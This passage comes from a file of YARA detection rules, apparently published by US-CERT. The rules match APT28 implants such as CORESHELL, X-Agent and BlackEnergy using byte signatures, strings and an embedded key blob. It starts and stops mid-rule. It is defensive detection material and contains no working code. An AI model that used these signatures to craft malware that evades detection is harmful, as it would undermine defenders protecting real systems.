$a3 = "IofCompleteRequest" ascii
$b1 = {31 A1 44 BC}
$b2 = "IoAttachDeviceToDeviceStack" ascii
$b3 = "KeInsertQueueDpc" ascii
$c1 = {A3 41 FD 66}
$c2 = {61 1E 4E F8}
$c3 = "PsCreateSystemThread" ascii
condition:
all of ($a*) and 3 of ($b*, $c*)
}
rule SSC_ABlackEnergy2
{
strings:
$ex1 = "DispatchCommand" ascii
$ex2 = "DispatchEvent" ascii
$a1 = {68 A1 B0 5C 72}
$a2 = {68 6B 43 59 4E}
$a3 = {68 E6 4B 59 4E}
condition:
all of ($ex*) and 3 of ($a*)
}
rule SSC_IMPLANT_1_v1 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {6A ?? E8 ?? ?? FF FF 59 85 C0 74 0B 8B C8 E8 ?? ?? FF FF 8B F0
EB 02 33 F6 8B CE E8 ?? ?? FF FF 85 F6 74 0E 8B CE E8 ?? ?? FF FF 56
E8 ?? ?? FF FF 59}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_1_v2 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {83 3E 00 53 74 4F 8B 46 04 85 C0 74 48 83 C0 02 50 E8 ?? ?? 00
00 8B D8 59 85 DB 74 38 8B 4E 04 83 F9 FF 7E 21 57 }
$STR2 = {55 8B EC 8B 45 08 3B 41 08 72 04 32 C0 EB 1B 8B 49 04 8B 04 81
80 78 19 01 75 0D FF 70 10 FF [5] 85 C0 74 E3 }
condition:
(uint16(0) == 0x5A4D) and any of them
}
rule SSC_IMPLANT_1_v3 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$rol7encode = { 0F B7 C9 C1 C0 07 83 C2 02 33 C1 0F B7 0A 47 66 85 C9 75 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_1_v4 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$XOR_LOOP = { 8B 45 FC 8D 0C 06 33 D2 6A 0B 8B C6 5B F7 F3 8A 82 ?? ??
?? ?? 32 04 0F 46 88 01 3B 75 0C 7C E0 }
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_1_v5 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$drivername = { 6A 30 ?? 6A 33 [5] 6A 37 [5] 6A 32 [5] 6A 31 [5] 6A 77
[5] 6A 69 [5] 6A 6E [5] 6A 2E [5] 6A 73 [5-9] 6A 79 [5] 6A 73 }
$mutexname = { C7 45 ?? 2F 2F 64 66 C7 45 ?? 63 30 31 65 C7 45 ?? 6C 6C
36 7A C7 45 ?? 73 71 33 2D C7 45 ?? 75 66 68 68 66 C7 45 ?? 66 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them
}
rule SSC_IMPLANT_1_v6 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$XORopcodes_eax = { 35 (22 07 15 0e|56 d7 a7 0a) }
$XORopcodes_others = { 81 (F1|F2|F3|F4|F5|F6|F7) (22 07 15 0E|56 D7 A7 0A) }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025) and any of them
}
rule SSC_IMPLANT_1_v7 {
meta:
description = "Downrage Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$XOR_FUNCT = { C7 45 ?? ?? ?? 00 10 8B 0E 6A ?? FF 75 ?? E8 ?? ?? FF FF }
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v1 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 8d ?? fa [2] e8 [2] FF FF C7 [2-5] 00 00 00 00 8D [2-5] 5? 6a 00 6a 01}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v2 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF [6-8]
48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v3 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {C1 EB 07 8D ?? 01 32 1C ?? 33 D2 }
$STR2 = {2B ?? 83 ?? 06 0F 83 ?? 00 00 00 EB 02 33 }
$STR3 = {89 ?? ?? 89 ?? ?? 89 55 ?? 89 45 ?? 3B ?? 0F 83 ?? 00 00 00 8D
?? ?? 8D ?? ?? FE }
condition:
(uint16(0) == 0x5A4D) and any of them
}
rule SSC_IMPLANT_2_v4 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53
56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68
[4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v5 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00 33
C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15 ?? 00
00 00 48 8B CC E8}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v6 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { e8 [2] ff ff 8b [0-6] 00 04 00 00 7F ?? [1-2] 00 02 00 00 7F
?? [1-2] 00 01 00 00 7F ?? [1-2] 80 00 00 00 7F ?? 83 ?? 40 7F}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v7 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$s1 = {10 A0 FA FD 83 3D 28 D4 1F FF 77 5? ?8 B4 50 CC 1E B0 78 D7 90 13
21 C0 23 3D 28 BC 78 95 DE 4B B0 60 00 00 0F 7F 38 B4 50 C8 D5 9F E0
25 DF F3 21 C0 28 BC 13 3D 2B 90 60 00 00 0F 7F 18 B4 50 C8 BC F2 21
C0 28 B4 5E 48 B5 5E 00 8D 41 FE 83 F8 06 8B 45 ?? 72 ?? 8B 4D ?? 8B }
$s2 = {28 D9 B0 00 00 00 00 FB 65 C0 AF E8 D3 40 28 B4 5? ?0 3C 20 FA FD
88 D7 A0 18 D4 2F F3 3D 2F 77 5? ?C 1E B0 78 BC 73 21 C0 A3 3D 2B 90
60 00 00 0F 7F 18 A4 D? ?8 B4 50 C8 0E 90 20 24 D? ?3 20 C0 28 B4 5?
?3 3D 2F 77 5? ?8 B4 50 C2 20 C0 28 BD 70 2D 93 01 E8 B4 D0 C8 D4 2F
E3 B4 5E 88 B4 5? ?8 95 5? ?7 2A 05 F5 E5 B8 BE 55 DC 20 80 }
condition:
(uint16(0) == 0x5A4D) and any of them
}
rule SSC_IMPLANT_2_v8 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89
74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D
04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76
4C 89 6C 24 }
$STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D
04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7
E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48
FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }
$STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04
1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1
C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }
$STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03
C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }
condition:
(uint16(0) == 0x5A4D) and any of them
}
rule SSC_IMPLANT_2_v9 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 8A C3 02 C0 02 D8 8B 45 F8 02 DB 83 C1 02 03 45 08 88 5D 0F 89
45 E8 8B FF 0F B6 5C 0E FE 8B 45 F8 03 C1 0F AF D8 8D 51 01 89 55 F4
33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B 45 F4 C1 EB 07 32 1C 32 33 D2
F7 F7 8A C1 02 45 0F 2C 02 32 04 32 33 D2 88 45 FF 8B C1 8B F7 F7 F6
8A 45 FF 8B 75 14 22 04 32 02 D8 8B 45 E8 30 1C 08 8B 4D F4 8D 51 FE
3B D7 72 A4 8B 45 E4 8B 7D E0 8B 5D F0 83 45 F8 06 43 89 5D F0 3B D8
0F 82 ?? ?? ?? ?? 3B DF 75 13 8D 04 7F 8B 7D 10 03 C0 2B F8 EB 09 33
C9 E9 5B FF FF FF 33 FF 3B 7D EC 0F 83 ?? ?? ?? ?? 8B 55 08 8A CB 02
C9 8D 04 19 02 C0 88 45 13 8D 04 5B 03 C0 8D 54 10 FE 89 45 E0 8D 4F
02 89 55 E4 EB 09 8D 9B 00 00 00 00 8B 45 E0 0F B6 5C 31 FE 8D 44 01
FE 0F AF D8 8D 51 01 89 55 0C 33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B
45 0C C1 EB 07 32 1C 32 33 D2 F7 F7 8A C1 02 45 13 2C 02 32 04 32 33
D2 88 45 0B 8B C1 8B F7 F7 F6 8A 45 0B 8B 75 14 22 04 32 02 D8 8B 45
E4 30 1C 01 8B 4D 0C }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_2_v10 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF [6-8]
48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v11 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53
56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68
[4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v12 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00
33 C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15
?? 00 00 00 48 8B CC E8}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v13 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF
[6-8] 48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_2_v14 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89
74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D
04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76
4C 89 6C 24  }
$STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D
04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7
E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48
FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }
$STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04
1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1
C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }
$STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03
C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }
condition:
(uint16(0) == 0x5A4D) and any of them
}
rule SSC_IMPLANT_2_v15 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$XOR_LOOP1 = { 32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 }
$XOR_LOOP2 = { 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 }
$XOR_LOOP3 = { 02 C3 30 06 8B 5D F0 8D 41 FE 83 F8 06 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_2_v16 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$OBF_FUNCT = { 0F B6 1C 0B 8D 34 08 8D 04 0A 0F AF D8 33 D2 8D 41 FF F7
75 F8 8B 45 0C C1 EB 07 8D 79 01 32 1C 02 33 D2 8B C7 89 5D E4 BB 06
00 00 00 F7 F3 8B 45 0C 8D 59 FE 02 5D FF 32 1C 02 8B C1 33 D2 B9 06
00 00 00 F7 F1 8B 45 0C 8B CF 22 1C 02 8B 45 E4 8B 55 E0 02 C3 30 06
8B 5D F0 8D 41 FE 83 F8 06 8B 45 DC 72 9A }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $OBF_FUNCT
}
rule SSC_IMPLANT_2_v17  {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 24108b44241c894424148b4424246836 }
$STR2 = { 518d4ddc516a018bd08b4de4e8360400 }
$STR3 = { e48178061591df75740433f6eb1a8b48 }
$STR4 = { 33d2f775f88b45d402d903c641321c3a }
$STR5 = { 006a0056ffd083f8ff74646a008d45f8 }
condition:
(uint16(0) == 0x5A4D) and 2 of them
}
rule SSC_IMPLANT_2_v18 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 8A C1 02 C0 8D 1C 08 8B 45 F8 02 DB 8D 4A 02 8B 55 0C 88 5D FF
8B 5D EC 83 C2 FE 03 D8 89 55 E0 89 5D DC 8D 49 00 03 C1 8D 34 0B 0F
B6 1C 0A 0F AF D8 33 D2 8D 41 FF F7 75 F4 8B 45 0C C1 EB 07 8D 79 01
32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 8B 45 0C 8D 59 FE
02 5D FF 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B 45 0C 8B CF 22
1C 02 8B 45 E4 8B 55 E0 02 C3 30 06 8B 5D DC 8D 41 FE 83 F8 06 8B 45
F8 72 9B 8B 4D F0 8B 5D D8 8B 7D 08 8B F0 41 83 C6 06 89 4D F0 89 75
F8 3B 4D D4 0F 82 ?? ?? ?? ?? 8B 55 E8 3B CB 75 09 8D 04 5B 03 C0 2B
F8 EB 02 33 FF 3B FA 0F 83 ?? ?? ?? ?? 8B 5D EC 8A C1 02 C0 83 C3 FE
8D 14 08 8D 04 49 02 D2 03 C0 88 55 0B 8D 48 FE 8D 57 02 03 C3 89 4D
D4 8B 4D 0C 89 55 F8 89 45 D8 EB 06 8D 9B 00 00 00 00 0F B6 5C 0A FE
8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42 FF 33 D2 F7 75 F4 C1
EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1 8A 4D F8 8B 45 0C 80
E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4 8B 45 0C 22 0C 02 8B
D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_2_v19 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$obfuscated_RSA1 = { 7C 41 B4 DB ED B0 B8 47 F1 9C A1 49 B6 57 A6 CC D6
74 B5 52 12 4D FC B1 B6 3B 85 73 DF AB 74 C9 25 D8 3C EA AE 8F 5E D2
E3 7B 1E B8 09 3C AF 76 A1 38 56 76 BB A0 63 B6 9E 5D 86 E4 EC B0 DC
89 1E FA 4A E5 79 81 3F DB 56 63 1B 08 0C BF DC FC 75 19 3E 1F B3 EE
9D 4C 17 8B 16 9D 99 C3 0C 89 06 BB F1 72 46 7E F4 0B F6 CB B9 C2 11
BE 5E 27 94 5D 6D C0 9A 28 F2 2F FB EE 8D 82 C7 0F 58 51 03 BF 6A 8D
CD 99 F8 04 D6 F7 F7 88 0E 51 88 B4 E1 A9 A4 3B }
$cleartext_RSA1 = { 06 02 00 00 00 A4 00 00 52 53 41 31 00 04 00 00 01
00 01 00 AF BD 26 C9 04 65 45 9F 0E 3F C4 A8 9A 18 C8 92 00 B2 CC 6E
0F 2F B2 71 90 FC 70 2E 0A F0 CA AA 5D F4 CA 7A 75 8D 5F 9C 4B 67 32
45 CE 6E 2F 16 3C F1 8C 42 35 9C 53 64 A7 4A BD FA 32 99 90 E6 AC EC
C7 30 B2 9E 0B 90 F8 B2 94 90 1D 52 B5 2F F9 8B E2 E6 C5 9A 0A 1B 05
42 68 6A 3E 88 7F 38 97 49 5F F6 EB ED 9D EF 63 FA 56 56 0C 7E ED 14
81 3A 1D B9 A8 02 BD 3A E6 E0 FA 4D A9 07 5B E6 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them
}
rule SSC_IMPLANT_2_v20 {
meta:
description = "CORESHELL/SOURFACE Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$func = { 0F B6 5C 0A FE 8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42
FF 33 D2 F7 75 F4 C1 EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1
8A 4D F8 8B 45 0C 80 E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4
8B 45 0C 22 0C 02 8B D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 8B 45
D8 89 55 F8 72 A0 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_3_v1 {
meta:
description = "X-Agent/CHOPSTICK Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = ">process isn't exist<" ascii wide
$STR2 = "shell\\open\\command=\"System Volume Information\\USBGuard.exe\" install" ascii wide
$STR3 = "User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0" ascii wide
$STR4 = "webhp?rel=psy&hl=7&ai=" ascii wide
$STR5 = {0f b6 14 31 88 55 ?? 33 d2 8b c1 f7 75 ?? 8b 45 ?? 41 0f b6 14
02 8a 45 ?? 03 fa}
condition:
any of them
}
rule SSC_IMPLANT_3_v2 {
meta:
description = "X-Agent/CHOPSTICK Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$base_key_moved = {C7 45 ?? 3B C6 73 0F C7 45 ?? 8B 07 85 C0 C7 45 ?? 74
02 FF D0 C7 45 ?? 83 C7 04 3B C7 45 ?? FE 72 F1 5F C7 45 ?? 5E C3 8B
FF C7 45 ?? 56 B8 D8 78 C7 45 ?? 75 07 50 E8 C7 45 ?? B1 D1 FF FF C7
45 ?? 59 5D C3 8B C7 45 ?? FF 55 8B EC C7 45 ?? 83 EC 10 A1 66 C7 45
?? 33 35}
$base_key_b_array = {3B C6 73 0F 8B 07 85 C0 74 02 FF D0 83 C7 04 3B FE
72 F1 5F 5E C3 8B FF 56 B8 D8 78 75 07 50 E8 B1 D1 FF FF 59 5D C3 8B
FF 55 8B EC 83 EC 10 A1 33 35 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them
}
rule SSC_IMPLANT_3_v3 {
meta:
description = "X-Agent/CHOPSTICK Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = ".?AVAgentKernel@@"
$STR2 = ".?AVIAgentModule@@"
$STR3 = "AgentKernel"
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them
}
rule SSC_IMPLANT_4_v1 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {55 8B EC 81 EC 54 01 00 00 83 65 D4 00 C6 45 D8 61 C6 45 D9 64
C6 45 DA 76 C6 45 DB 61 C6 45 DC 70 C6 45 DD 69 C6 45 DE 33 C6 45 DF
32 C6 45 E0 2EE9 ?? ?? ?? ??} $STR2 = {C7 45 EC 5A 00 00 00 C7 45 E0
46 00 00 00 C7 45 E8 5A 00 00 00 C7 45 E4 46 00 00 00}
condition:
(uint16(0)== 0x5A4D or uint16(0) == 0xCFD0 or uint16(0)== 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 1 of them
}
rule SSC_IMPLANT_4_v2 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$BUILD_USER32 = {75 73 65 72 ?? ?? ?? 33 32 2E 64}
$BUILD_ADVAPI32 = {61 64 76 61 ?? ?? ?? 70 69 33 32}
$CONSTANT = {26 80 AC C8}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_4_v3 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$a1 = "Adobe Flash Player Installer" wide nocase
$a3 = "regedt32.exe" wide nocase
$a4 = "WindowsSysUtility" wide nocase
$a6 = "USB MDM Driver" wide nocase
$b1 = {00 05 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00
4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00
00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 3F 00 00 00
00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 5C 04 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00
6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 1C 02 00 00 01 00 30 00 30
00 31 00 35 00 30 00 34 00 62 00 30 00 00 00 4C 00 16 00 01 00 43 00
